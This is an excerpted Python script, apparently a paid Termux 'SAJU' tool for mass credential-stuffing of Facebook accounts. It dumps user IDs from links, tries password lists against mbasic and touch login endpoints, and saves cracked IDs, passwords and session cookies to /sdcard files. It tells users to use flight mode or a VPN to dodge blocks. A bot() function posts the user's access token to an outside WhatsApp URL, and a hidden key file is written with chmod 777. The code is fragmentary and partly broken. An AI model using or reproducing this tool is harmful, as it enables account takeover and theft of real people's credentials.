...
try:
    rq = requests.get('https://github.com/Akash-RKS/Hard-update/Aproval.txt').text
...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mWELL COME TO SAJU 🌹TOOL \033[1;35m• \033[1;36m• \033[1;34m•')
...
def bot():
	try:
		requests.post("https://wa.me/+8801721474011?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
def menu():
	...
	print(f'\033[1;37m()==============================================()    ')
	print("%s══════════════════════════════════════════%s"%(B,P))
	print(f'[{H}√{P}] [%s01%s] CREATE NEW FILE UNLIMITED    [%sOF%s]'%(K,N,B,N));time.sleep(0.03)
	print(f'[{H}√{P}] [%s02%s] CREATE NEW FILE  [%sOF%s]'%(K,N,B,N));time.sleep(0.03)
	print(f'[{H}√{P}] [%s03%s] FILE CRACKER     [%sON%s]'%(K,N,B,N));time.sleep(0.03)
	print(f'[{H}√{P}] [%s00%s] EXIT  [%sON%s]'%(M,N,M,N));time.sleep(0.03)
	print("%s══════════════════════════════════════════%s"%(B,P))
	_____𝙰𝙺𝙰𝚂𝙷__xd_____ = input('\n>> Choise : ')
	if _____𝙰𝙺𝙰𝚂𝙷__xd_____ in ['01']:
		
		os.system('python Dump.py')
	elif _____𝙰𝙺𝙰𝚂𝙷__xd_____ in ['02,']:
		
		os.system('python Dump.py')
	elif _____𝙰𝙺𝙰𝚂𝙷__xd_____ in ['03']:
		crack_file()
	elif _____𝙰𝙺𝙰𝚂𝙷__xd_____ in ['4']:
		menu()
	elif _____𝙰𝙺𝙰𝚂𝙷__xd_____ in ['5']:
		result()
	elif _____𝙰𝙺𝙰𝚂𝙷__xd_____ in ['0']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> HOW MANY LINKS DO YOU WAN TO CLONE ? : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> FRIST INPUT ID LINK FOR.DUMP BRO ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('>> INPUT 1ST ID LINK '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print(f'>> Total idz dump🔥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
def crack_file():
	#
			...
			banner()
			print(f'\033[1;37m()==============================================()    ')
			print('\t\x1b[1;97m[\x1b[1;92m  F I L E - C L O N I N G \x1b[1;97m]')
			print(f'\033[1;37m()==============================================()    ')
			try:
...
def setting():
	...
	banner()
	print(f'\033[1;37m()==============================================()    ')
	print('\t\x1b[1;97m[\x1b[1;92m  S E L E C T - I D  \x1b[1;97m]')
	print(f'\033[1;37m()==============================================()    ')
	print(f'{x}>> 1. Choise Old ')
	print('>> 2. Choise New ')
	print('>> 3. Random New/Old ')
	print('')
	hu = input('>> Choise : ')
	if hu in ['1','01']:
		...
		exit()
	print(f'\033[1;37m()==============================================()    ')
	print("\t\x1b[1;97m[\x1b[1;92m  M E T H O D - M E N U  \x1b[1;97m] ")
	print(f'\033[1;37m()==============================================()    ')
	print('>> 1. mbasic.facebook.com [ B E S T ] ')
	print('>> 2. mbasic.facebook.com  [ N O R M A L ] ')
	print('>> 3. touch.facebook.com [ S L O W ]  ')
	print('>> 4. mtouch.facebook.com [ N E W ] ')
	print(f'\033[1;37m()==============================================()    ')
	hc = input('>> Choise : ')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print(f'\033[1;37m()==============================================()    ')
	_jembot_ = input('[=>] SHOW APPS [Y ] NOT SHOW APP [t] ( Y/t ) ')
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
		...
		taplikasi.append('no')
	pwplus=input('=> PASWORD MENU  : [ MANUAL ] [ y ]  : [ AUTO ] [ t ] ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def passwrd():
	...
	banner()
	print(f'\033[1;37m()==============================================()    ')
	print(f'\t\033[1;37m\033[1;41mUSE FLIGHT MODE BEFORE USE\033[1;0m\33[1;37m  ')
	print(f'\t\033[1;37m\033[1;41mIF YOU NO RESULT USE SMART VPN\033[1;0m\33[1;37m  ')
	print(f'\033[1;37m()==============================================()    ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r\x1b[1;92m𝚂𝙰𝙹𝚄 =>{P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}=𝚂𝙰𝙹𝚄=CP=>{k} {idf}|{pw}{N}')     
				...
				if 'no' in taplikasi:
					...
					print(f'\r{x}=𝚂𝙰𝙹𝚄=OK=>{H}{idf}|{pw}|{kuki}{N}')
					...
					print(f'\r{x}=𝚂𝙰𝙹𝚄=OK=> {H}{idf}|{pw}|{kuki}\n{infoakun}{x}')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/𝚂𝙰𝙹𝚄-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/𝚂𝙰𝙹𝚄-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
...
def genkey():
	try:
		rn = open('/data/data/com.termux/files/usr/bin/.base4-cov', 'r').read()
		rb = rn+basesplit
		banner()
		print(f'\033[1;37m()==============================================()    ')
		print('\033[0;92mTHIS TOOL IS PAID YOU HAVE TO TAKE SUBCRIPTION FIRST')
		print(f'\033[1;37m()==============================================()    ')
		print("\033[0;92mYOU ARE NOT PREMIUM USER ")
		print(f'\033[1;37m()==============================================()    ')
		print("\033[0;97mYOUR KEY : \033[0;92m%s%s"%(rb,basesplit))
		print(f'\033[1;37m()==============================================()    ')
		print("\033[0;92mTOOL PRICE : %s Pkr : 250"%(H))
		print(f'\033[1;37m()==============================================()    ')
		print("\033[0;92mVALIDITY : %s1 Week "%(H))
		print(f'\033[1;37m()==============================================()    ')
		subprocess.check_output(["am", "start", "https://wa.me/+8801721474011"])
		exit()
	except(IOError):
		rb = rx
		open("/data/data/com.termux/files/usr/bin/.base4-cov","w").write(rb)
		os.system("chmod 777 /data/data/com.termux/files/usr/bin/.base4-cov")
		banner()
		print(f'\033[1;37m()==============================================()    ')
		print('\033[0;92mTHIS TOOL IS PAID YOU HAVE TO TAKE SUBCRIPTION FIR')
		print(f'\033[1;37m()==============================================()    ')
		print("\033[0;92mYOU ARE NOT PREMIUM USER ")
		print(f'\033[1;37m()==============================================()    ')
		print("\033[0;97mYOUR KEY : \033[0;92m%s%s"%(rb,basesplit))
		print(f'\033[1;37m()==============================================()    ')
		print("\033[0;92mTOOL PRICE : %s BDT : 250"%(H))
		print(f'\033[1;37m()==============================================()    ')
		print("\033[0;92mVALIDITY : %s1 Week "%(H))
		print(f'\033[1;37m()==============================================()    ')
		subprocess.check_output(["am", "start", "https://wa.me/+8801721474011"])
...
def keycheck():
    try:
        k = open("/data/data/com.termux/files/usr/bin/.base4-cov","r").read()
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/𝙰𝙺𝙰𝚂𝙷-DUMP')
	except:pass
